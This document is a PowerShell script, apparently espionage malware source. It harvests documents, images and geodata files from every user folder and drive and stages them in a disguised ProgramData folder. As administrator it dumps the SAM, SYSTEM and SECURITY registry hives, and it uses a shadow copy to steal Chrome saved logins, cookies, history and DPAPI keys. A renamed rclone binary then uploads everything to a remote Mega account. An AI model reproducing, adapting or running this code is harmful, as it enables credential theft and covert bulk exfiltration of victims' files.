function Invoke-StreamCopy {
param (
    [switch]$First,
    [switch]$Chrome,
    [switch]$Stream,
    [switch]$DownAll,
    [string]$objName,
    [string]$destMega
)

function Test-isAdmin {
  
    $user = [Security.Principal.WindowsIdentity]::GetCurrent();
    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
}

function SearchAndCopy ($LocalPath, $Second) {
    
    $num = 1
    $files = (Get-ChildItem -Path $LocalPath -Recurse -Include $exts -Exclude "~$*") | Where-Object {$_.Length -lt $size}
    if ($Second) { 
        $files = $files | Where-Object {$_.LastWriteTime -gt (Get-Date).AddHours(-200) }
    } else {
        $files = $files | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-500) }  
    }
    
    foreach ($file in $files) {
        $hash = (Get-FileHash -Algorithm MD5 $file).hash 
        if ((Select-String -path $hashfile -Pattern $hash) -eq $null) {
            $file.FullName | Out-File -Encoding utf8 -FilePath $logfile -Append
            if (Test-Path -Path (Join-Path $allDestDir $file.Name)) {
                Copy-Item $file.FullName -Destination ($allDestDir + '\' + $file.BaseName + "_$num" + $file.Extension) -Recurse -Container
                if ($Second) {
                    New-Item $sendDestDir -ItemType Directory -ea 0 
                    Copy-Item $file.FullName -Destination ($sendDestDir + '\' + $file.BaseName + "_$num" + $file.Extension) -Recurse -Container 
                }
                $num+=1
            } else {
                Copy-Item $file.FullName -Destination $allDestDir
                if ($Second) { New-Item $sendDestDir -ItemType Directory -ea 0 ; Copy-Item $file.FullName -Destination $sendDestDir }
            }
            $hash | Out-File -Encoding utf8 -FilePath $hashfile -Append
        }  else { 
            ($file.FullName + " : --- OLD FILE ---") | Out-File -Encoding utf8 -FilePath $logfile -Append
           }
        }
}

function Secure-Copy ($param) {

        foreach ($usersDir in (gci $srcdir)) {
            foreach ($deskDir in $deskDirs) { 
                SearchAndCopy -LocalPath (Join-Path $usersDir.FullName $deskDir) -second $param 
            }
        }
        foreach ($allPath in $allPaths) { 
            if (Test-Path -Path $allPath) {
                SearchAndCopy -LocalPath $allPath -second $param 
            }
        }
    }

function Chrome-Copy ($usersDir) {
    
    #$user = (((Split-Path $usersDir.fullName -Leaf) -Replace '\.[^\.]*$') + '\')
    $chromeUserDestDir = ($chromeDestDir + $usersDir.Name + '\'); New-Item $chromeUserDestDir -ItemType Directory -ea 0
    $chromeUserDataDir = ($usersDir.FullName + '\' + '\AppData\local\Google\chrome\user data\')
    Copy-Item -Force ($chromeUserDataDir + '\Local State') -Destination ($chromeUserDestDir)
    Copy-Item -Force -Recurse ($usersDir.FullName + '\AppData\Roaming\Microsoft\protect\*') -Destination ($chromeUserDestDir)
    attrib.exe -h -s ($chromeUserDestDir + '\*') /s #; attrib +h +s ($chromeUserDir + '\CREDHIST'); attrib +h +s ($chromeUserDir + '\SYNCHIST')

    foreach ($profile in (gci -Path $chromeUserDataDir -recurse | Where-Object {$_.BaseName -eq 'History'})) {
        $chromeProfileDestDir = ($chromeUserDestDir + $profile.Directory.Name + '\'); New-Item $chromeProfileDestDir -ItemType Directory -ea 0
        Copy-Item -Force ($profile.Directory.FullName + '\History') -Destination $chromeProfileDestDir
        Copy-Item -Force ($profile.Directory.FullName + '\Login Data') -Destination $chromeProfileDestDir
        $cPath = ($($volume.DeviceObject) + '\' + ($profile.Directory.FullName).Substring(2) + '\Network\Cookies')
        echo $cPath
        cmd /c copy $cPath $chromeProfileDestDir
    }
}


[bool]$second = $false
$baseDir = 'C:\ProgramData\Waves\'; New-Item $baseDir -ItemType Directory -ea 0
$appsDir = $baseDir + 'Apps\'; New-Item $appsDir -ItemType Directory -ea 0
$srcdir = 'C:\Users\'
$allPaths = @('A:','B:','D:','E:','F:','G:','H:','I:','J:','K:','L:','M:','N:','O:','P:','Q:','R:','S:','T:','U:','V:','W:','Z:','X:','Y:')
$destDir = ($baseDir + 'Docs\') ; New-Item $destDir -ItemType Directory -ea 0

$allDestDir = ($destDir + 'ALL\'); New-Item $allDestDir -ItemType Directory -ea 0
$hashfile = ($destDir + 'checksum.txt') ;New-Item $hashfile -ItemType File -ea 0
$logfile = ($destDir + 'logs.txt'); New-Item $logfile -ItemType File -ea 0


$currDateTime = (Get-Date -UFormat %d.%m.%y..%H.%M)
$currDate = (Get-Date -UFormat %d.%m.%y)
$currYear = (Get-Date -UFormat %Y)
$size = 100*1024*1024
$exts = ('*.doc','*.docx','*.rtf','*.xls','*.xlsm','*.xlsx','*.pdf','*.txt','*.zip','*.rar','*.7z','*.jpg','*.kme','*.kml','*.kmz','*.scene','*.json','*zones.txt','*.jpeg','*.png','*.bmp','*.ppt','*.pptx','*.odt','*.csv')
#$archname = $env:COMPUTERNAME + '_' + $CurrDateTime + '.zip'
$deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')

    if ($objName -eq "") { $objName = $env:COMPUTERNAME }

    if ($destMega -eq "") { $destMega = "ZSUDocs" }

    if (($First -ne $true) -and ($Stream -ne $true) -and ($Chrome -ne $true) -and ($DownAll -ne $true)) {
        echo "You must specify at least one of <First> or <Stream> or <DownAll>"
    }

    if ($Stream -OR $First) { 
        echo '<><><><><><><><><><><><><><><><><><><><><><><><><><><>' | Out-File -Encoding utf8 -FilePath $logfile -Append
        $CurrDateTime | Out-File -Encoding utf8 -FilePath $logfile -Append
        echo '<><><><><><><><><><><><><><><><><><><><><><><><><><><>' | Out-File -Encoding utf8 -FilePath $logfile -Append
    }

    if ($Chrome) {
        $chromeDestDir = ($destDir + 'Chrome\'); New-Item $chromeDestDir -ItemType Directory -ea 0
        if (Test-isAdmin) {
            reg.exe save hklm\sam $chromeDestDir\SAM
            reg.exe save hklm\system $chromeDestDir\SYSTEM
            reg.exe save hklm\security $chromeDestDir\SECURITY
        }

        $VSsvc = (Get-Service -name VSS)
        if($VSsvc.Status -ne "Running")
        {
            $notrunning=1
            $VSsvc.Start()
        }

        $id = (Get-WmiObject -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
        $volume = (Get-WmiObject win32_shadowcopy -filter "ID='$id'")

        foreach ($usersDir in (gci $srcdir)) {
            if ($usersDir.Name -eq "Public") { continue }
            Chrome-Copy ($usersDir)
        }

        $volume.Delete()
        if($notrunning -eq 1) { $VSsvc.Stop() }

        Compress-Archive $chromeDestDir -Destination "$destDir\Chrome_$currDateTime.zip"

    }


    if ($First) {
        Secure-Copy -param $false
        echo "Upload Documents . . ." 
        &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') copy -M -P $allDestDir mgp:/$destMega/AllObjFirst/$objName/
    }

    if ($DownAll) {
        echo "Upload Documents . . ." 
        &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') copy -M -P $allDestDir mgp:/$destMega/AllObjFirst/$objName/
    }
    
    if ($Stream) {
        $etalonhash = (Get-FileHash -Algorithm MD5 $hashfile).hash
        $sendDestDir = $destDir + $CurrDateTime
        
        Secure-Copy -param $true

        $newhash = (Get-FileHash -Algorithm MD5 $hashfile).hash
        if ($newhash -ne $etalonhash) {
            echo "Upload Documents . . ."
            &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') copy -M -P $sendDestDir mgp:/$destMega/$currYear/$currDate/$objName/
        }
    }
}